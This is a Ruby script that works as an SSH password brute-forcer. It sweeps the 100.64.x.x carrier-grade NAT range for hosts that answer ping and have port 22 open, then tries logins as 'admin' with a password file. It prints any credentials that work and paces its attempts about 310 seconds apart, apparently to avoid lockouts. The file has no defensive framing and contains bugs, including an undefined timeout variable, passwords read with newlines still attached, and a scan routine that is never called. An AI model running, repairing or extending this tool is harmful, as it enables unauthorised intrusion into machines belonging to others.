require 'bundler/inline'
require 'date'
require 'timeout'
require 'socket'

gemfile do
  source 'https://rubygems.org'
  gem 'net-ssh'
  gem 'net-ping'
  gem 'debug'
end

file_path = './data/passwords.txt'
LOGIN = 'admin'.freeze

def pingable?(host)
  Timeout.timeout(2) { Net::Ping::External.new(host).ping? }
rescue StandardError
  false
end

def pingable_hosts(hosts)
  hosts.select { |host| pingable?(host) }
end

def connectable?(host, port: 22)
  Timeout.timeout(timeout) do
    TCPSocket.new(host, port).close
    true
  rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
    false
  end
end

def connectable_hosts(hosts)
  hosts.select { |host| connectable?(host) }
end

def hosts_gen
  [].tap do |hosts|
    (1..254).each do |i|
      (1..254).each do |j|
        hosts << "100.64.#{i}.#{j}"
      end
    end
  end
end

def fill_passwords(f)
  file = File.new(f, 'r:UTF-8')
  passwords = file.readlines
  file.close
  passwords
end

def scan(passwords_os, connectable_hosts_os)
  passwords_os.each do |pwd| ##################
    start_time = DateTime.now
    connectable_hosts_os.each do |host|
      Net::SSH.start(host, LOGIN, password: pwd, timeout: 2) do |_ssh|
        puts "host: #{host} password: #{pwd}"
      end
    rescue StandardError => e
      puts "err: #{e}"
    end
    diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
    sleep(310 - diff) if diff < 310
  end
end
